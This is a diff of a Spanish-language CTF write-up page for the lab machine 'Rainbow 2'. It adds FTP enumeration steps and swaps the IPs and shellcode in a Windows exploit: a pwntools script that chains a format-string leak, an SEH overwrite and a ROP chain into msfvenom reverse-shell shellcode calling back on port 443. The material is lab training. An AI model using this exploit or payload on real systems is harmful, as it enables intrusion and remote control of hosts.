@@ -130,8 +130,9 @@
     <div class="izquierda">
       <h3 class="post-title">Contenido</h3><br>
       <ul>
-        <li><a href="#reversing">Reversing</a></li>
-        <li><a href="#exploitation">Explotación</a></li>
+        <li><a href="#enumeration">Enumeración</a></li>
+        <li><a href="#shell-dev">Shell - dev</a></li>
+        <li><a href="#shell-system">Shell - system</a></li>
       </ul>
   </div>
 
@@ -141,10 +142,61 @@
     <h2 class="post-title">Rainbow 2</h2><br>
   </header>
   
-<section class="post" id="reversing">
-<br><h3 class="post-title">Reversing</h3><br>
+<section class="post" id="enumeration">
+<br><h3 class="post-title">Enumeración</h3><br>
 
-<p class="plain-text">Al ejecutar el <a href="https://github.com/xchg2pwn/ExploitDevelopment/blob/main/Rainbow 2_CTF/dev_keysvc.exe">binario</a> se nos muestra que se ha iniciado un servidor en algun puerto</p>
+<p class="plain-text">Iniciamos la máquina escaneando los puertos de la máquina con <code class="language-plaintext highlighter-rouge">nmap</code> donde encontramos varios puertos abiertos, entre ellos el <code class="language-plaintext highlighter-rouge">21</code> que corre un servicio <code class="language-plaintext highlighter-rouge">ftp</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ nmap </span><span class="p">10.10.122.10
+Nmap scan report for 10.10.122.10  
+PORT     STATE SERVICE
+21/tcp   open  ftp
+2121/tcp open  ccproxy-ftp
+3389/tcp open  ms-wbt-server</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ya que esta abierto iniciaremos por conectarnos a <code class="language-plaintext highlighter-rouge">ftp</code>, en este caso admite la autenticacion por defecto del usuario <code class="language-plaintext highlighter-rouge">anonymous</code> sin proporcionar contraseña</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ftp </span><span class="p">10.10.122.10
+Connected to 10.10.122.10.
+220 Microsoft FTP Service
+Name (10.10.122.10:user): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.  
+Password:
+230 User logged in.
+Remote system type is Windows_NT.
+ftp></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Encontramos un par de archivos, un <code class="language-plaintext highlighter-rouge">.exe</code>, un <code class="language-plaintext highlighter-rouge">.txt</code> y dentro de la carpeta <code class="language-plaintext highlighter-rouge">SysWOW64</code> la libreria <code class="language-plaintext highlighter-rouge">kernel32.dll</code> probablemente de la versión que utiliza, descargamos todos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">ftp> dir
+229 Entering Extended Passive Mode (|||5000|)
+150 Opening ASCII mode data connection.
+06-05-22  11:57AM               705536 filesrv.exe
+06-05-22  02:43PM                  275 README.txt
+06-09-22  05:36AM       &ltDIR>          SysWOW64
+226 Transfer complete.
+ftp> dir SysWow64
+229 Entering Extended Passive Mode (|||5001|)
+125 Data connection already open; Transfer starting.  
+05-11-22  03:46AM               641872 kernel32.dll
+226 Transfer complete.
+ftp></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">El archivo <code class="language-plaintext highlighter-rouge">README.txt</code> nos dice que después de algunos ataques se han agregado mitigaciones para exploits de corrupción de memoria como <code class="language-plaintext highlighter-rouge">ASLR</code>, <code class="language-plaintext highlighter-rouge">DEP</code> y <code class="language-plaintext highlighter-rouge">GS</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ cat</span><span class="p"> README.txt
+# FileSrv v0.2
+
+Our simple file sharing server! Currently under development - we still seem to have some minor problems with binary files.  
+
+Changelog:
+ - After our last custom server got hacked we made sure to enable all mitigations: ASLR, DEP, GS! Now it's 100% secure.</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al ejecutar el binario se nos muestra que se ha iniciado un servidor en algun puerto</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="p">PS C:\Users\user\Desktop></span><span class="am"> .\filesrv.exe</span><span class="p">  
 Starting Rainbow2 Server...!</span>
@@ -159,6 +211,10 @@ Starting Rainbow2 Server...!</span>
 AAAAAAAABBBBBBBB
 ERROR</span>
 </code></pre></div></div><br>
+
+</section>
+<section class="post" id="shell-dev">
+<br><h3 class="post-title">Shell - dev</h3><br>
 
 <p class="plain-text">Para poder depurar el programa facilmente abriremos la aplicación dentro de <code class="language-plaintext highlighter-rouge">WinDbg</code></p>
 <a href="/vulnlab/rainbow2/2.png" target="_blank"><div><p><img src="/vulnlab/rainbow2/2.png"></p></div></a>
@@ -282,11 +338,6 @@ C:\shared\filesrv.exe  </span>
 Path: filesrv.exe
 TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA+AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQokAAAAAAAAAJsIVFjfaToL32k6C99pOgsMGzkK0mk6CwwbPwpqaToLDBs+CslpOguNHD4KzWk6C40cOQrLaToLjRw/CpJpOgsMGzsK2mk6C99pOwuhaToLHhw/CtxpOgseHMUL3mk6Cx4cOAreaToLUmljaN9pOgsAAAAAAAAAAFBFAABMAQUAGJqcYgAAAAAAAAAA4AACAQsBDh0A8AgAAOYBAAAAAAA5EAMAABAAAAAACQAAABBAABAAAAACAAAGAAAAAAAAAAYAAAAAAAAAAAALAAAEAAAAAAAAAwBAgQAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAA/FMKADwAAAAAoAoA4AEAAAAAAAAAAAAAAAAAAAAAAAAAsAoAqE4AAIzZCQBUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA4NkJAEAAAAAAAAAAAAAAAAAACQAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALnRleHQAAACj7ggAABAAAADwCAAABAAAAAAAAAAAAAAAAAAAIAAAYC5yZGF0YQAA6F4BAAAACQAAYAEAAPQIAAAAAAAAAAAAAAAAAEAAAEAuZGF0YQAAACwzAAAAYAoAAB4AAABUCgAAAAAAAAAAAAAAAABAAADALnJzcmMAAADgAQAAAKAKAAACAAAAcgoAAAAAAAAAAAAAAAAAQAAAQC5yZWxvYwAAqE4AAACwCgAAUAAAAHQKAAAAAAAAAAAAAAAAAEAAAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAVYvsagC5SHw=  </span>
 </code></pre></div></div><br>
-
-</section>
-
-<section class="post" id="exploitation">
-<br><h3 class="post-title">Explotación</h3><br>
 
 <p class="plain-text">Sabemos que el path se refleja en la respuesta y probablemente ocasione una vulnerabilidad de format string, enviaremos varias <code class="language-plaintext highlighter-rouge">%p</code> separados por un <code class="language-plaintext highlighter-rouge">.</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
@@ -925,7 +976,7 @@ filesrv+0x11394:
 
 <p class="plain-text">Ya que podemos ejecutar un shellcode con este exploit solo nos queda generar un nuevo shellcode usando <code class="language-plaintext highlighter-rouge">msfvenom</code> que envie una reverse shell por el puerto <code class="language-plaintext highlighter-rouge">443</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ msfvenom </span><span class="p">-p windows/shell_reverse_tcp LHOST=192.168.100.73 LPORT=443 -b </span><span class="am">'\x00\x09\x0a\x0b\x0c\x0d\x20\x25'</span><span class="p"> -f python -v shellcode -e x86/shikata_ga_nai -n 16  
+<code><span class="ve">❯ msfvenom </span><span class="p">-p windows/shell_reverse_tcp LHOST=10.8.0.10 LPORT=443 -b </span><span class="am">'\x00\x09\x0a\x0b\x0c\x0d\x20\x25'</span><span class="p"> -f python -v shellcode -e x86/shikata_ga_nai -n 16  
 Found 1 compatible encoders
 Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
 x86/shikata_ga_nai succeeded with size 351 (iteration=0)
@@ -934,40 +985,40 @@ Successfully added NOP sled of size 16 from x86/single_byte
 Payload size: 367 bytes
 Final size of python file: 2063 bytes
 shellcode =  b""
-shellcode += b"\xfd\x99\x4b\x41\xfd\x93\xf9\x27\x43\xf9\x99"
-shellcode += b"\x4b\x90\x40\x92\x90\xbb\x8b\x50\x0f\xbe\xdb"
-shellcode += b"\xd1\xd9\x74\x24\xf4\x5d\x33\xc9\xb1\x52\x31"
-shellcode += b"\x5d\x12\x83\xed\xfc\x03\xd6\x5e\xed\x4b\x14"
-shellcode += b"\xb6\x73\xb3\xe4\x47\x14\x3d\x01\x76\x14\x59"
-shellcode += b"\x42\x29\xa4\x29\x06\xc6\x4f\x7f\xb2\x5d\x3d"
-shellcode += b"\xa8\xb5\xd6\x88\x8e\xf8\xe7\xa1\xf3\x9b\x6b"
-shellcode += b"\xb8\x27\x7b\x55\x73\x3a\x7a\x92\x6e\xb7\x2e"
-shellcode += b"\x4b\xe4\x6a\xde\xf8\xb0\xb6\x55\xb2\x55\xbf"
-shellcode += b"\x8a\x03\x57\xee\x1d\x1f\x0e\x30\x9c\xcc\x3a"
-shellcode += b"\x79\x86\x11\x06\x33\x3d\xe1\xfc\xc2\x97\x3b"
-shellcode += b"\xfc\x69\xd6\xf3\x0f\x73\x1f\x33\xf0\x06\x69"
-shellcode += b"\x47\x8d\x10\xae\x35\x49\x94\x34\x9d\x1a\x0e"
-shellcode += b"\x90\x1f\xce\xc9\x53\x13\xbb\x9e\x3b\x30\x3a"
-shellcode += b"\x72\x30\x4c\xb7\x75\x96\xc4\x83\x51\x32\x8c"
-shellcode += b"\x50\xfb\x63\x68\x36\x04\x73\xd3\xe7\xa0\xf8"
-shellcode += b"\xfe\xfc\xd8\xa3\x96\x31\xd1\x5b\x67\x5e\x62"
-shellcode += b"\x28\x55\xc1\xd8\xa6\xd5\x8a\xc6\x31\x19\xa1"
-shellcode += b"\xbf\xad\xe4\x4a\xc0\xe4\x22\x1e\x90\x9e\x83"
-shellcode += b"\x1f\x7b\x5e\x2b\xca\x2c\x0e\x83\xa5\x8c\xfe"
-shellcode += b"\x63\x16\x65\x14\x6c\x49\x95\x17\xa6\xe2\x3c"
-shellcode += b"\xe2\x21\xcd\x69\x88\xf8\xa5\x6b\x50\xfa\x8e"
-shellcode += b"\xe5\xb6\x96\xe0\xa3\x61\x0f\x98\xe9\xf9\xae"
-shellcode += b"\x65\x24\x84\xf1\xee\xcb\x79\xbf\x06\xa1\x69"
-shellcode += b"\x28\xe7\xfc\xd3\xff\xf8\x2a\x7b\x63\x6a\xb1"
-shellcode += b"\x7b\xea\x97\x6e\x2c\xbb\x66\x67\xb8\x51\xd0"
-shellcode += b"\xd1\xde\xab\x84\x1a\x5a\x70\x75\xa4\x63\xf5"
-shellcode += b"\xc1\x82\x73\xc3\xca\x8e\x27\x9b\x9c\x58\x91"
-shellcode += b"\x5d\x77\x2b\x4b\x34\x24\xe5\x1b\xc1\x06\x36"
-shellcode += b"\x5d\xce\x42\xc0\x81\x7f\x3b\x95\xbe\xb0\xab"
-shellcode += b"\x11\xc7\xac\x4b\xdd\x12\x75\x7b\x94\x3e\xdc"
-shellcode += b"\x14\x71\xab\x5c\x79\x82\x06\xa2\x84\x01\xa2"
-shellcode += b"\x5b\x73\x19\xc7\x5e\x3f\x9d\x34\x13\x50\x48"
-shellcode += b"\x3a\x80\x51\x59"</span>
+shellcode += b"\x91\x41\x49\x91\x92\x37\x90\xf5\xf9\x49\x48"
+shellcode += b"\xd6\x93\x91\x4a\xf8\xdb\xc5\xd9\x74\x24\xf4"
+shellcode += b"\x58\xbb\xf3\x01\xbe\xec\x31\xc9\xb1\x52\x83"
+shellcode += b"\xc0\x04\x31\x58\x13\x03\xab\x12\x5c\x19\xb7"
+shellcode += b"\xfd\x22\xe2\x47\xfe\x42\x6a\xa2\xcf\x42\x08"
+shellcode += b"\xa7\x60\x73\x5a\xe5\x8c\xf8\x0e\x1d\x06\x8c"
+shellcode += b"\x86\x12\xaf\x3b\xf1\x1d\x30\x17\xc1\x3c\xb2"
+shellcode += b"\x6a\x16\x9e\x8b\xa4\x6b\xdf\xcc\xd9\x86\x8d"
+shellcode += b"\x85\x96\x35\x21\xa1\xe3\x85\xca\xf9\xe2\x8d"
+shellcode += b"\x2f\x49\x04\xbf\xfe\xc1\x5f\x1f\x01\x05\xd4"
+shellcode += b"\x16\x19\x4a\xd1\xe1\x92\xb8\xad\xf3\x72\xf1"
+shellcode += b"\x4e\x5f\xbb\x3d\xbd\xa1\xfc\xfa\x5e\xd4\xf4"
+shellcode += b"\xf8\xe3\xef\xc3\x83\x3f\x65\xd7\x24\xcb\xdd"
+shellcode += b"\x33\xd4\x18\xbb\xb0\xda\xd5\xcf\x9e\xfe\xe8"
+shellcode += b"\x1c\x95\xfb\x61\xa3\x79\x8a\x32\x80\x5d\xd6"
+shellcode += b"\xe1\xa9\xc4\xb2\x44\xd5\x16\x1d\x38\x73\x5d"
+shellcode += b"\xb0\x2d\x0e\x3c\xdd\x82\x23\xbe\x1d\x8d\x34"
+shellcode += b"\xcd\x2f\x12\xef\x59\x1c\xdb\x29\x9e\x63\xf6"
+shellcode += b"\x8e\x30\x9a\xf9\xee\x19\x59\xad\xbe\x31\x48"
+shellcode += b"\xce\x54\xc1\x75\x1b\xfa\x91\xd9\xf4\xbb\x41"
+shellcode += b"\x9a\xa4\x53\x8b\x15\x9a\x44\xb4\xff\xb3\xef"
+shellcode += b"\x4f\x68\xb6\xe7\x4f\x62\xae\xf5\x4f\x73\x95"
+shellcode += b"\x73\xa9\x19\xf9\xd5\x62\xb6\x60\x7c\xf8\x27"
+shellcode += b"\x6c\xaa\x85\x68\xe6\x59\x7a\x26\x0f\x17\x68"
+shellcode += b"\xdf\xff\x62\xd2\x76\xff\x58\x7a\x14\x92\x06"
+shellcode += b"\x7a\x53\x8f\x90\x2d\x34\x61\xe9\xbb\xa8\xd8"
+shellcode += b"\x43\xd9\x30\xbc\xac\x59\xef\x7d\x32\x60\x62"
+shellcode += b"\x39\x10\x72\xba\xc2\x1c\x26\x12\x95\xca\x90"
+shellcode += b"\xd4\x4f\xbd\x4a\x8f\x3c\x17\x1a\x56\x0f\xa8"
+shellcode += b"\x5c\x57\x5a\x5e\x80\xe6\x33\x27\xbf\xc7\xd3"
+shellcode += b"\xaf\xb8\x35\x44\x4f\x13\xfe\x74\x1a\x39\x57"
+shellcode += b"\x1d\xc3\xa8\xe5\x40\xf4\x07\x29\x7d\x77\xad"
+shellcode += b"\xd2\x7a\x67\xc4\xd7\xc7\x2f\x35\xaa\x58\xda"
+shellcode += b"\x39\x19\x58\xcf"</span>
 </code></pre></div></div><br>
 
 <p class="plain-text">Nuestro exploit final inicia sobrescribiendo el controlador <code class="language-plaintext highlighter-rouge">SEH</code> con un stack pivot que retorna a un ropchain el cual llama a <code class="language-plaintext highlighter-rouge">VirtualAlloc</code> para cambiar los privilegios del stack, una vez ye es ejecutable salta al shellcode y ejecuta la reverse shell</p>
@@ -975,7 +1026,7 @@ shellcode += b"\x3a\x80\x51\x59"</span>
 <code><span class="c1">#!/usr/bin/python3
 </span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> remote, p32
 
-shell</span><span class="o"> =</span><span class="p"> remote(</span><span class="s">"192.168.100.5"</span><span class="p">,</span><span class="mi"> 2121</span><span class="p">)
+shell</span><span class="o"> =</span><span class="p"> remote(</span><span class="s">"10.10.122.10"</span><span class="p">,</span><span class="mi"> 2121</span><span class="p">)
 
 shell.sendline(</span><span class="no">b</span><span class="s">"TEST %p.%p"</span><span class="p">)
 shell.recvuntil(</span><span class="no">b</span><span class="s">"."</span><span class="p">)
@@ -1016,40 +1067,40 @@ rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span
 rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x11394</span><span class="p">)</span><span class="c1"> # jmp esp;</span><span class="p">
 
 shellcode </span><span class="o">=  </span><span class="no">b</span><span class="s">""</span><span class="p">
-shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xfd\x99\x4b\x41\xfd\x93\xf9\x27\x43\xf9\x99</span><span class="s">"</span><span class="p">
-shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x4b\x90\x40\x92\x90\xbb\x8b\x50\x0f\xbe\xdb</span><span class="s">"</span><span class="p">
-shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xd1\xd9\x74\x24\xf4\x5d\x33\xc9\xb1\x52\x31</span><span class="s">"</span><span class="p">
-shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x5d\x12\x83\xed\xfc\x03\xd6\x5e\xed\x4b\x14</span><span class="s">"</span><span class="p">
-shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xb6\x73\xb3\xe4\x47\x14\x3d\x01\x76\x14\x59</span><span class="s">"</span><span class="p">
-shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x42\x29\xa4\x29\x06\xc6\x4f\x7f\xb2\x5d\x3d</span><span class="s">"</span><span class="p">
-shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xa8\xb5\xd6\x88\x8e\xf8\xe7\xa1\xf3\x9b\x6b</span><span class="s">"</span><span class="p">
-shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xb8\x27\x7b\x55\x73\x3a\x7a\x92\x6e\xb7\x2e</span><span class="s">"</span><span class="p">
-shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x4b\xe4\x6a\xde\xf8\xb0\xb6\x55\xb2\x55\xbf</span><span class="s">"</span><span class="p">
-shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x8a\x03\x57\xee\x1d\x1f\x0e\x30\x9c\xcc\x3a</span><span class="s">"</span><span class="p">
-shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x79\x86\x11\x06\x33\x3d\xe1\xfc\xc2\x97\x3b</span><span class="s">"</span><span class="p">
-shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xfc\x69\xd6\xf3\x0f\x73\x1f\x33\xf0\x06\x69</span><span class="s">"</span><span class="p">
-shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x47\x8d\x10\xae\x35\x49\x94\x34\x9d\x1a\x0e</span><span class="s">"</span><span class="p">
-shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x90\x1f\xce\xc9\x53\x13\xbb\x9e\x3b\x30\x3a</span><span class="s">"</span><span class="p">
-shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x72\x30\x4c\xb7\x75\x96\xc4\x83\x51\x32\x8c</span><span class="s">"</span><span class="p">
-shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x50\xfb\x63\x68\x36\x04\x73\xd3\xe7\xa0\xf8</span><span class="s">"</span><span class="p">
-shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xfe\xfc\xd8\xa3\x96\x31\xd1\x5b\x67\x5e\x62</span><span class="s">"</span><span class="p">
-shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x28\x55\xc1\xd8\xa6\xd5\x8a\xc6\x31\x19\xa1</span><span class="s">"</span><span class="p">
-shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xbf\xad\xe4\x4a\xc0\xe4\x22\x1e\x90\x9e\x83</span><span class="s">"</span><span class="p">
-shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x1f\x7b\x5e\x2b\xca\x2c\x0e\x83\xa5\x8c\xfe</span><span class="s">"</span><span class="p">
-shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x63\x16\x65\x14\x6c\x49\x95\x17\xa6\xe2\x3c</span><span class="s">"</span><span class="p">
-shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xe2\x21\xcd\x69\x88\xf8\xa5\x6b\x50\xfa\x8e</span><span class="s">"</span><span class="p">
-shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xe5\xb6\x96\xe0\xa3\x61\x0f\x98\xe9\xf9\xae</span><span class="s">"</span><span class="p">
-shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x65\x24\x84\xf1\xee\xcb\x79\xbf\x06\xa1\x69</span><span class="s">"</span><span class="p">
-shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x28\xe7\xfc\xd3\xff\xf8\x2a\x7b\x63\x6a\xb1</span><span class="s">"</span><span class="p">
-shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x7b\xea\x97\x6e\x2c\xbb\x66\x67\xb8\x51\xd0</span><span class="s">"</span><span class="p">
-shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xd1\xde\xab\x84\x1a\x5a\x70\x75\xa4\x63\xf5</span><span class="s">"</span><span class="p">
-shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xc1\x82\x73\xc3\xca\x8e\x27\x9b\x9c\x58\x91</span><span class="s">"</span><span class="p">
-shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x5d\x77\x2b\x4b\x34\x24\xe5\x1b\xc1\x06\x36</span><span class="s">"</span><span class="p">
-shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x5d\xce\x42\xc0\x81\x7f\x3b\x95\xbe\xb0\xab</span><span class="s">"</span><span class="p">
-shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x11\xc7\xac\x4b\xdd\x12\x75\x7b\x94\x3e\xdc</span><span class="s">"</span><span class="p">
-shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x14\x71\xab\x5c\x79\x82\x06\xa2\x84\x01\xa2</span><span class="s">"</span><span class="p">
-shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x5b\x73\x19\xc7\x5e\x3f\x9d\x34\x13\x50\x48</span><span class="s">"</span><span class="p">
-shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x3a\x80\x51\x59</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x91\x41\x49\x91\x92\x37\x90\xf5\xf9\x49\x48</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xd6\x93\x91\x4a\xf8\xdb\xc5\xd9\x74\x24\xf4</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x58\xbb\xf3\x01\xbe\xec\x31\xc9\xb1\x52\x83</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xc0\x04\x31\x58\x13\x03\xab\x12\x5c\x19\xb7</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xfd\x22\xe2\x47\xfe\x42\x6a\xa2\xcf\x42\x08</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xa7\x60\x73\x5a\xe5\x8c\xf8\x0e\x1d\x06\x8c</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x86\x12\xaf\x3b\xf1\x1d\x30\x17\xc1\x3c\xb2</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x6a\x16\x9e\x8b\xa4\x6b\xdf\xcc\xd9\x86\x8d</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x85\x96\x35\x21\xa1\xe3\x85\xca\xf9\xe2\x8d</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x2f\x49\x04\xbf\xfe\xc1\x5f\x1f\x01\x05\xd4</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x16\x19\x4a\xd1\xe1\x92\xb8\xad\xf3\x72\xf1</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x4e\x5f\xbb\x3d\xbd\xa1\xfc\xfa\x5e\xd4\xf4</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xf8\xe3\xef\xc3\x83\x3f\x65\xd7\x24\xcb\xdd</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x33\xd4\x18\xbb\xb0\xda\xd5\xcf\x9e\xfe\xe8</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x1c\x95\xfb\x61\xa3\x79\x8a\x32\x80\x5d\xd6</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xe1\xa9\xc4\xb2\x44\xd5\x16\x1d\x38\x73\x5d</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xb0\x2d\x0e\x3c\xdd\x82\x23\xbe\x1d\x8d\x34</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xcd\x2f\x12\xef\x59\x1c\xdb\x29\x9e\x63\xf6</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x8e\x30\x9a\xf9\xee\x19\x59\xad\xbe\x31\x48</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xce\x54\xc1\x75\x1b\xfa\x91\xd9\xf4\xbb\x41</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x9a\xa4\x53\x8b\x15\x9a\x44\xb4\xff\xb3\xef</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x4f\x68\xb6\xe7\x4f\x62\xae\xf5\x4f\x73\x95</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x73\xa9\x19\xf9\xd5\x62\xb6\x60\x7c\xf8\x27</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x6c\xaa\x85\x68\xe6\x59\x7a\x26\x0f\x17\x68</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xdf\xff\x62\xd2\x76\xff\x58\x7a\x14\x92\x06</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x7a\x53\x8f\x90\x2d\x34\x61\xe9\xbb\xa8\xd8</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x43\xd9\x30\xbc\xac\x59\xef\x7d\x32\x60\x62</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x39\x10\x72\xba\xc2\x1c\x26\x12\x95\xca\x90</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xd4\x4f\xbd\x4a\x8f\x3c\x17\x1a\x56\x0f\xa8</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x5c\x57\x5a\x5e\x80\xe6\x33\x27\xbf\xc7\xd3</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xaf\xb8\x35\x44\x4f\x13\xfe\x74\x1a\x39\x57</span><span class="s">"</span><span class="p">
